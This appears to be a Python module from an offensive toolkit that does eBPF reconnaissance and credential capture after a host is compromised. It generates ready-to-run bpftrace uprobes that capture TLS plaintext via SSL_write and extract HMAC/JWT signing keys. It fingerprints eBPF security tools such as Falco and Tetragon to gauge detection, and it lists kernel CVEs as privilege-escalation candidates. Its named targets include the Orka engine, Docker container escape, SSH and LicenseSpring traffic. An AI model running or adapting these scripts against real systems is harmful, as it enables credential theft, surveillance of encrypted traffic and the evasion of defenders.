"""eBPF analysis, tracing, and exploit-surface detection for Ablation.

Synthesized from: https://ebpf.io/what-is-ebpf/
Architecture: Linux kernel 4.4+ (stable), 5.x+ (full BTF/CO-RE/ring-buf support)
NOT available on macOS — macOS uses DTrace + EndpointSecurity framework instead.

Post-compromise role:
  1. Enumerate eBPF capability on current host
  2. Enumerate already-loaded programs/maps (security tools, container runtimes)
  3. Generate ready-to-run bpftrace one-liners for target process tracing
  4. Detect eBPF-based defense tools (Cilium, Falco, Tetragon, Tracee)
  5. Build uprobe scripts for plaintext credential extraction (OpenSSL, gRPC, JWT)

Orka-specific targets:
  - Orka engine: Swift binary + NIO/gRPC over /var/run/orka-engine.sock
  - Docker daemon: container escape via setns/pivot_root
  - SSH daemon: credential harvesting
  - LicenseSpring HTTPS: TLS session key extraction via SSL_write uprobe
"""

import os
import re
import shutil
import subprocess
from pathlib import Path
from typing import Optional


# ── Capability detection ──────────────────────────────────────────────────────

def has_bpf_capability() -> bool:
    """Check if current process has CAP_BPF (or root)."""
    return os.geteuid() == 0 or _check_cap_bpf()


def _check_cap_bpf() -> bool:
    try:
        out = subprocess.check_output(['capsh', '--print'], stderr=subprocess.DEVNULL, timeout=3).decode()
        return 'cap_bpf' in out.lower() or 'cap_sys_admin' in out.lower()
    except Exception:
        return False


def check_kernel_bpf_support() -> dict:
    """Probe kernel eBPF readiness: version, BTF, JIT, unprivileged state."""
    result = {}
    try:
        uname = subprocess.check_output(['uname', '-r'], timeout=3).decode().strip()
        result['kernel'] = uname
        major, minor = (int(x) for x in uname.split('.')[:2] if x.isdigit()), None
    except Exception:
        pass

    # BTF presence (needed for CO-RE / bpftool)
    result['btf'] = os.path.exists('/sys/kernel/btf/vmlinux')

    # JIT enabled?
    jit_path = '/proc/sys/net/core/bpf_jit_enable'
    if os.path.exists(jit_path):
        result['jit_enabled'] = Path(jit_path).read_text().strip() == '1'

    # Unprivileged eBPF
    unpriv = '/proc/sys/kernel/unprivileged_bpf_disabled'
    if os.path.exists(unpriv):
        val = Path(unpriv).read_text().strip()
        result['unprivileged_bpf'] = val == '0'  # 0 = enabled (risky)

    # bpftool available?
    result['bpftool'] = bool(shutil.which('bpftool'))
    result['bpftrace'] = bool(shutil.which('bpftrace'))
    result['bcc_available'] = bool(shutil.which('python3') and _bcc_importable())

    return result


def _bcc_importable() -> bool:
    try:
        subprocess.check_call(
            ['python3', '-c', 'import bcc'],
            stderr=subprocess.DEVNULL, timeout=3
        )
        return True
    except Exception:
        return False


# ── Enumerate loaded eBPF programs and maps ───────────────────────────────────

def enumerate_loaded_programs() -> list:
    """Run bpftool prog list and parse results."""
    if not shutil.which('bpftool'):
        return []
    try:
        out = subprocess.check_output(
            ['bpftool', 'prog', 'list', '--json'],
            stderr=subprocess.DEVNULL, timeout=10
        ).decode()
        import json
        return json.loads(out)
    except Exception:
        return []


def enumerate_loaded_maps() -> list:
    """Run bpftool map list and parse results."""
    if not shutil.which('bpftool'):
        return []
    try:
        out = subprocess.check_output(
            ['bpftool', 'map', 'list', '--json'],
            stderr=subprocess.DEVNULL, timeout=10
        ).decode()
        import json
        return json.loads(out)
    except Exception:
        return []


def detect_ebpf_security_tools(programs: list, maps: list) -> list:
    """Identify known eBPF-based security/observability tools from program/map names."""
    detections = []
    signatures = {
        'cilium':   ['cilium', 'cil_', 'ct4_global', 'cilium_calls'],
        'falco':    ['falco', 'falco_syscall', 'falco_perf'],
        'tetragon': ['tetragon', 'tg_', 'kprobe_execve'],
        'tracee':   ['tracee', 'raw_tracepoint', 'trace_net'],
        'pixie':    ['pem_', 'pixie'],
        'datadog':  ['dd_bpf', 'datadog'],
        'sysdig':   ['sysdig', 'scap'],
        'ebpf_exporter': ['ebpf_exporter'],
    }
    combined_names = []
    for p in programs:
        combined_names.append(p.get('name', ''))
    for m in maps:
        combined_names.append(m.get('name', ''))
    names_str = ' '.join(combined_names).lower()

    for tool, sigs in signatures.items():
        if any(s in names_str for s in sigs):
            detections.append(tool)
    return detections


# ── bpftrace one-liner generation ────────────────────────────────────────────

class BpftraceScripts:
    """Ready-to-run bpftrace one-liners for post-compromise tracing."""

    @staticmethod
    def syscall_monitor(pid: Optional[int] = None) -> str:
        """Trace all syscalls for a process or globally."""
        pid_filter = f'pid == {pid} && ' if pid else ''
        return (
            f'bpftrace -e \'tracepoint:raw_syscalls:sys_enter '
            f'{{ if ({pid_filter}1) printf("%s(%d): %s\\n", comm, pid, args.id); }}\''
        )

    @staticmethod
    def execve_trace() -> str:
        """Trace all new process executions — lateral movement detection."""
        return (
            "bpftrace -e 'tracepoint:syscalls:sys_enter_execve "
            "{ printf(\"%s(%d) execve: %s\\n\", comm, pid, str(args.filename)); }'"
        )

    @staticmethod
    def openssl_tls_capture(ssl_lib: str = '/usr/lib/x86_64-linux-gnu/libssl.so.3') -> str:
        """Uprobe SSL_write to capture plaintext before TLS encryption.

        Works for: HTTPS connections, gRPC/TLS channels, JWT token sends.
        Point at libssl.so on the target system; adjust path as needed.
        Captured data = plaintext HTTP request body / proto payload.
        """
        return (
            f"bpftrace -e 'uprobe:{ssl_lib}:SSL_write "
            f"{{ printf(\"[TLS-WRITE] pid=%d len=%d\\n%s\\n\", pid, arg2, str(arg1, arg2)); }}'"
        )

    @staticmethod
    def grpc_capture(binary_path: str) -> str:
        """Uprobe gRPC send on a specific binary (e.g., Orka engine).

        Swift NIO/gRPC serializes protobufs before handing to libssl.
        Attach to the write syscall for the target process to capture raw proto frames.
        """
        return (
            f"bpftrace -e 'tracepoint:syscalls:sys_enter_write "
            f"/comm == \"{Path(binary_path).name}\"/ "
            f"{{ printf(\"[GRPC-WRITE] pid=%d fd=%d len=%d\\n\", pid, args.fd, args.count); "
            f"printf(\"%s\\n\", str(args.buf, args.count)); }}'"
        )

    @staticmethod
    def socket_connect_trace() -> str:
        """Trace all outbound TCP connections — maps lateral movement paths."""
        return (
            "bpftrace -e 'tracepoint:syscalls:sys_enter_connect "
            "{ printf(\"%s(%d) connect fd=%d\\n\", comm, pid, args.fd); }'"
        )

    @staticmethod
    def setns_trace() -> str:
        """Detect container namespace switching — container escape indicator."""
        return (
            "bpftrace -e 'tracepoint:syscalls:sys_enter_setns "
            "{ printf(\"[SETNS] pid=%d comm=%s fd=%d nstype=%d\\n\", "
            "pid, comm, args.fd, args.nstype); }'"
        )

    @staticmethod
    def setuid_trace() -> str:
        """Trace setuid/setgid/capset — privilege escalation indicator."""
        return (
            "bpftrace -e '"
            "tracepoint:syscalls:sys_enter_setuid { "
            "  printf(\"[SETUID] pid=%d comm=%s uid=%d\\n\", pid, comm, args.uid); } "
            "tracepoint:syscalls:sys_enter_capset { "
            "  printf(\"[CAPSET] pid=%d comm=%s\\n\", pid, comm); }'"
        )

    @staticmethod
    def file_open_trace(path_pattern: str = '/etc/') -> str:
        """Trace file opens for sensitive paths — credential file access."""
        return (
            f"bpftrace -e 'tracepoint:syscalls:sys_enter_openat "
            f"{{ if (str(args.filename) =~ \"{path_pattern}*\") "
            f"printf(\"%s(%d) open: %s\\n\", comm, pid, str(args.filename)); }}'"
        )

    @staticmethod
    def memory_dump_pattern(pid: int, symbol: str, lib: str) -> str:
        """Uprobe on a specific function to dump first 256 bytes of arg0.

        Useful for: JWT signing functions, key derivation, password hashing.
        Example: symbol='HMAC', lib='/usr/lib/libcrypto.so'
        """
        return (
            f"bpftrace -e 'uprobe:{lib}:{symbol} "
            f"/pid == {pid}/ "
            f"{{ printf(\"[{symbol}] \"); "
            f"printf(\"%r\\n\", buf(arg0, 256)); }}'"
        )

    @staticmethod
    def orka_engine_trace(pid: Optional[int] = None) -> str:
        """Combined Orka engine tracing: gRPC writes + socket connects + file opens."""
        pid_filter = f'/pid == {pid}/' if pid else '/comm == "orka-engine"/'
        return (
            f"bpftrace -e '"
            f"tracepoint:syscalls:sys_enter_write {pid_filter} "
            f"{{ printf(\"[ORKA-WRITE] fd=%d len=%d\\n%s\\n\", args.fd, args.count, str(args.buf, args.count)); }} "
            f"tracepoint:syscalls:sys_enter_openat {pid_filter} "
            f"{{ printf(\"[ORKA-OPEN] %s\\n\", str(args.filename)); }} "
            f"tracepoint:syscalls:sys_enter_connect {pid_filter} "
            f"{{ printf(\"[ORKA-CONNECT] fd=%d\\n\", args.fd); }}'"
        )

    @staticmethod
    def jwt_signing_capture() -> str:
        """Capture JWT signing calls in OpenSSL HMAC — extracts secret key in memory.

        HMAC_Init_ex(ctx, key, key_len, md, engine)
        arg1 = key pointer, arg2 = key_len
        Works when Orka engine uses HS256 with empty secret (confirmed vulnerability).
        """
        return (
            "bpftrace -e '"
            "uprobe:/usr/lib/x86_64-linux-gnu/libcrypto.so*:HMAC_Init_ex "
            "{ printf(\"[JWT-KEY] len=%d key=%r\\n\", arg2, buf(arg1, arg2)); }'"
        )

    @staticmethod
    def docker_escape_monitor() -> str:
        """Monitor Docker container escape primitives: unshare, pivot_root, setns."""
        return (
            "bpftrace -e '"
            "tracepoint:syscalls:sys_enter_unshare "
            "{ printf(\"[UNSHARE] pid=%d comm=%s flags=0x%x\\n\", pid, comm, args.clone_flags); } "
            "tracepoint:syscalls:sys_enter_pivot_root "
            "{ printf(\"[PIVOT_ROOT] pid=%d new=%s old=%s\\n\", pid, str(args.new_root), str(args.put_old)); } "
            "tracepoint:syscalls:sys_enter_setns "
            "{ printf(\"[SETNS] pid=%d comm=%s nstype=%d\\n\", pid, comm, args.nstype); }'"
        )


# ── eBPF exploit surface detection ────────────────────────────────────────────

UNPRIVILEGED_BPF_CVES = {
    'CVE-2021-3490': 'ALU32 bounds tracking bypass → arbitrary r/w → root',
    'CVE-2021-3489': 'ring buffer OOB write → root',
    'CVE-2020-8835': 'verifier sign-extension bypass → root',
    'CVE-2017-16995': 'sign extension error → OOB r/w → root (kernel <4.14)',
    'CVE-2022-23222': 'pointer arithmetic bypass → root (kernel <5.16.1)',
    'CVE-2023-2163': 'incorrect verifier pruning → root (kernel <6.4)',
}


def check_unprivileged_bpf_cves(kernel_version: str) -> list:
    """Given kernel version string, return potentially applicable CVEs."""
    applicable = []
    try:
        major, minor, patch = [int(x) for x in re.findall(r'\d+', kernel_version)[:3]]
    except Exception:
        return []

    def ver_lte(ma, mi, pa):
        return (major, minor, patch) <= (ma, mi, pa)

    if ver_lte(4, 14, 0):
        applicable.append('CVE-2017-16995')
    if ver_lte(5, 16, 1):
        applicable.append('CVE-2022-23222')
    if ver_lte(5, 12, 0):
        applicable.append('CVE-2021-3490')
        applicable.append('CVE-2021-3489')
        applicable.append('CVE-2020-8835')
    if ver_lte(6, 3, 0):
        applicable.append('CVE-2023-2163')

    return [(cve, UNPRIVILEGED_BPF_CVES[cve]) for cve in applicable if cve in UNPRIVILEGED_BPF_CVES]


# ── eBPFAnalyzer class ────────────────────────────────────────────────────────

class eBPFAnalyzer:
    """Post-compromise eBPF capability assessment and tracing script generator."""

    def __init__(self):
        self.findings = []
        self.scripts = BpftraceScripts()

    def _add_finding(self, title: str, severity: str, detail: str):
        self.findings.append({'tool': 'ebpf_analyzer', 'title': title,
                              'severity': severity, 'detail': detail})

    def run(self, target_pid: Optional[int] = None, ssl_lib: Optional[str] = None) -> dict:
        report = {
            'capability': {},
            'kernel_support': {},
            'loaded_programs': [],
            'loaded_maps': [],
            'security_tools_detected': [],
            'cve_candidates': [],
            'tracing_scripts': {},
            'findings': [],
        }

        report['capability'] = {
            'root': os.geteuid() == 0,
            'cap_bpf': has_bpf_capability(),
        }

        report['kernel_support'] = check_kernel_bpf_support()
        kver = report['kernel_support'].get('kernel', '')

        # Unprivileged eBPF — escalation path if true
        if report['kernel_support'].get('unprivileged_bpf'):
            self._add_finding(
                'Unprivileged eBPF Enabled',
                'HIGH',
                'kernel.unprivileged_bpf_disabled=0 — local users can load eBPF programs; '
                'combined with kernel version, may enable privilege escalation',
            )
            cves = check_unprivileged_bpf_cves(kver)
            report['cve_candidates'] = cves
            for cve, desc in cves:
                self._add_finding(f'eBPF CVE Candidate: {cve}', 'HIGH', desc)

        # BTF not available — limits CO-RE but not basic tracing
        if not report['kernel_support'].get('btf'):
            self._add_finding('BTF Not Present', 'INFO',
                               'CO-RE eBPF programs require /sys/kernel/btf/vmlinux; '
                               'use older kernel-version-specific BCC approach instead')

        # Enumerate loaded programs if root
        if report['capability']['root'] or report['capability']['cap_bpf']:
            report['loaded_programs'] = enumerate_loaded_programs()
            report['loaded_maps'] = enumerate_loaded_maps()
            detected = detect_ebpf_security_tools(report['loaded_programs'], report['loaded_maps'])
            report['security_tools_detected'] = detected
            for tool in detected:
                self._add_finding(
                    f'eBPF Security Tool Active: {tool}',
                    'INFO',
                    f'{tool} eBPF programs detected — may generate alerts on syscall tracing activity',
                )

        # Determine SSL library path
        if not ssl_lib:
            for candidate in [
                '/usr/lib/x86_64-linux-gnu/libssl.so.3',
                '/usr/lib/aarch64-linux-gnu/libssl.so.3',
                '/usr/lib/x86_64-linux-gnu/libssl.so.1.1',
                '/usr/local/lib/libssl.so',
            ]:
                if os.path.exists(candidate):
                    ssl_lib = candidate
                    break
            ssl_lib = ssl_lib or '/usr/lib/x86_64-linux-gnu/libssl.so.3'

        # Generate tracing scripts
        report['tracing_scripts'] = {
            'syscall_monitor': self.scripts.syscall_monitor(target_pid),
            'execve_trace':    self.scripts.execve_trace(),
            'tls_capture':     self.scripts.openssl_tls_capture(ssl_lib),
            'socket_connect':  self.scripts.socket_connect_trace(),
            'setns_detect':    self.scripts.setns_trace(),
            'setuid_trace':    self.scripts.setuid_trace(),
            'sensitive_files': self.scripts.file_open_trace('/etc/'),
            'jwt_key_capture': self.scripts.jwt_signing_capture(),
            'docker_escape':   self.scripts.docker_escape_monitor(),
            'orka_engine':     self.scripts.orka_engine_trace(target_pid),
        }

        if not report['capability']['root'] and not report['capability']['cap_bpf']:
            self._add_finding(
                'eBPF Requires Privilege',
                'INFO',
                'CAP_BPF / root needed for kprobe/uprobe attachment; '
                'obtain privilege first, then re-run ebpf_analyzer',
            )

        report['findings'] = self.findings
        return report


# ── Top-level wrapper ─────────────────────────────────────────────────────────

def analyze_ebpf(target_pid: Optional[int] = None, ssl_lib: Optional[str] = None) -> dict:
    return eBPFAnalyzer().run(target_pid=target_pid, ssl_lib=ssl_lib)
